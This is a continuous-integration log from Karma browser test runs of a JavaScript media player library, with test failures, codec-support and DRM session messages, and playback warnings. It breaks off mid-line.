karma.conf.js\n+ xvfb-run karma start --single-run --no-colors --reporters junit,dots --browsers Chrome\n..........................................................................\nChrome 44.0.2403 (Linux 0.0.0) Player live support for segment duration template plays two full segments of content FAILED\n    Failed: The browser failed to decode the media content.\n    Error: The browser failed to decode the media content.\n        at shaka.player.Player.onError_ (/var/lib/jenkins/jobs/Manual PR Test/workspace/lib/player/player.js:375:15)\n    Expected 1439857414.039333 to be greater than 1439857426.039333.\n        at /var/lib/jenkins/jobs/Manual PR Test/workspace/spec/util.js:358:31\n    Failed: Timeout waiting for video time 1439857426.039333\n        at waitForTargetTime (/var/lib/jenkins/jobs/Manual PR Test/workspace/spec/util.js:353:16)\n        at setTestExpectations (/var/lib/jenkins/jobs/Manual PR Test/workspace/spec/live_integration.js:139:9)\n................................................................................\n............................WARN [web-server]: 404: /base/assets/does_not_exist\nWARN [web-server]: 404: /base/assets/does_not_exist\nWARN [web-server]: 404: /base/assets/does_not_exist\n....................................\nChrome 44.0.2403 (Linux 0.0.0): Executed 219 of 219 (1 FAILED) (2 mins 7.869 secs / 2 mins 7.769 secs)\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. CI error: Failed to parse log file!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. All tests passed!\n. Testing in progress...\n. Testing in progress...\n. Failure:\nChrome 47.0.2526 (Linux 0.0.0) mpd.BaseUrl resolves relative URLs with respect to the MPD URL FAILED\n    TypeError: Cannot read property 'toString' of undefined\n        at Object.<anonymous> (/var/lib/jenkins/jobs/Manual PR Test/workspace/spec/mpd_parser_base_url_spec.js:152:23)\nChrome 47.0.2526 (Linux 0.0.0) mpd handles a Location element with a BaseURL FAILED\n    Expected 'updated_mpd' to be 'http://example.com/updated_mpd'.\n        at Object.<anonymous> (/var/lib/jenkins/jobs/Manual PR Test/workspace/spec/mpd_spec.js:555:43)\n. Testing in progress...\n. All tests passed!\n. Failure:\n+ ./build/all.sh\n128 files checked, no errors found.\n0 error(s), 0 warning(s), 98.7% typed\n+ test -e karma.conf.js\n+ export NODE_PATH=/usr/local/lib/node_modules\n+ NODE_PATH=/usr/local/lib/node_modules\n+ xvfb-run karma start --single-run --no-colors --reporters junit,dots --browsers Chrome\n.....\nINFO: 'Using native Promises.'\nINFO: 'Using native EME as-is.'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 10, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 24, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '20', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 39, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '22', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 50, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '20', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'audio/webm; codecs=\"vorbis\"', 'is', 'supported'\nINFO: '+', 'video/webm; codecs=\"vp8\"', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: '+', 'text/vtt', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Switching stream to', {uniqueId: 62, segmentIndexSource: {subtitlesUrl_: {urls: ..., startByte: ..., endByte: ..., requestPromise_: ..., request_: ..., callback_: ..., currentUrl: ...}, segmentIndex_: {references: ..., timestampCorrection: ...}}, segmentInitSource: null, id: '19', timestampOffset: 0, bandwidth: null, width: null, height: null, mimeType: 'text/vtt', codecs: '', keyIds: [], allowedByKeySystem: true, allowedByApplication: true}\nINFO: 'Stream video/webm:', 'stream has started.'\nINFO: 'Stream audio/webm:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Restricting', 'stream', '2.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '1.', 'The application has applied new video track restrictions.'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Restricting', 'stream', '2.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '1.', 'The application has applied new video track restrictions.'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Restricting', 'stream', '2.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '1.', 'The application has applied new video track restrictions.'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\nINFO: 'Starting each stream from', 0\nINFO: 'Permitting', 'stream', '2.', 'The application has applied new video track restrictions.'\nINFO: 'Permitting', 'stream', '1.', 'The application has applied new video track restrictions.'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Starting each stream from', 0\nINFO: 'Restricting', 'stream', '5.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '5.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '4.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '3.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '2.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '1.', 'The application has applied new video track restrictions.'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.640028\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401f\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: 'Restricting', 'stream', '5.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '4.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '3.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '2.', 'The application has applied new video track restrictions.'\nINFO: 'Restricting', 'stream', '1.', 'The application has applied new video track restrictions.'\nINFO: 'MKSC', Object{audioCapabilities: undefined, videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'MKSC', Object{audioCapabilities: [Object{contentType: ..., robustness: ...}], videoCapabilities: [Object{contentType: ..., robustness: ...}], initDataTypes: undefined, distinctiveIdentifier: 'optional', persistentState: 'optional', sessionTypes: ['temporary']}\nINFO: 'onEncrypted_', Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}, Object{type: 'encrypted', initDataType: 'webm', initData: Uint8Array{0: 96, 1: 6, 2: 30, 3: 1, 4: 126, 5: 71, 6: 126, 7: 135, 8: 126, 9: 87, 10: 208, 11: 13, 12: 30, 13: 208, 14: 13, 15: 30}}\nINFO: 'onSessionMessage_', MediaKeyMessageEvent{}\nINFO: 'onLicenseSuccess_', MediaKeySession{}\nINFO: 'onSessionReady_', MediaKeySession{}\n................................................................................\n...\nINFO: 'Using native Promises.'\nINFO: 'Using native EME as-is.'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.64001e\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.64001e\"', 'is', 'supported'\nINFO: 'Starting each stream from', 1452719968.02\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0.0106658935546875\n.\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.64001e\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.64001e\"', 'is', 'supported'\nINFO: 'Starting each stream from', 1452719980.013\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0\nWARN: 'Playhead has been moved outside of the seekable range:', 'seekable', [1452719699.938, 1452719981.935], 'attempted', 1452709698.936, 'Adjusting...'\n.\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.64001e\"', 'is', 'supported'\nINFO: '+', 'audio/mp4; codecs=\"mp4a.40.2\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.64001e\"', 'is', 'supported'\nINFO: 'Starting each stream from', 1452719986.01\nINFO: 'Stream audio/mp4:', 'stream has started.'\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 0.016000032424926758\nWARN: 'Playhead has been moved outside of the seekable range:', 'seekable', [1452719702.934, 1452719987.932], 'attempted', 1452729986.931, 'Adjusting...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1182449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 235.24899982452393\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -0.04171199999998976\nINFO: 'Updating manifest...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1182449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 235.24499987602235\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -0.04171199999998976\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1182449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 235.24500011444093\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -0.04171199999998976\nWARN: 'Playhead has been moved outside of the seekable range:', 'seekable', [0, 236.94528797901918], 'attempted', 10235.944288, 'Adjusting...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: 'Starting each stream from', 230.24799989700318\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', 4.95828800000001\nWARN: 'Timestamp correction (4.95828800000001)', 'is unreasonably large for live content.', 'The content may have errors in it.'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1632449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 240.24499987602235\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -5.04171199999999\nWARN: 'Timestamp correction (-5.04171199999999)', 'is unreasonably large for live content.', 'The content may have errors in it.'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1182449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 235.24500011444093\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -0.04171199999998976\nINFO: 'Updating manifest...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1182449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 235.2439999485016\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -0.04171199999998976\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nINFO: '+', 'video/mp4; codecs=\"avc1.4d401e\"', 'is', 'supported'\nWARN: 'SegmentTimeline contains a large gap/overlap.', 'The content may have errors in it.', {startTime: 1182449, duration: 1069800, repeat: null}\nINFO: 'Starting each stream from', 235.24500011444093\nINFO: 'Stream video/mp4:', 'stream has started.'\nINFO: 'All Streams have completed startup!'\nINFO: 'Timestamp correction', -0.04171199999998976\nWARN: 'Playhead has been moved outside of the seekable range:', 'seekable', [0, 236.49328807629396], 'attempted', 10235.491287, 'Adjusting...'\n.\nINFO: '+', 'video/mp4; codecs=\"avc1.4d4015\"', 'is', 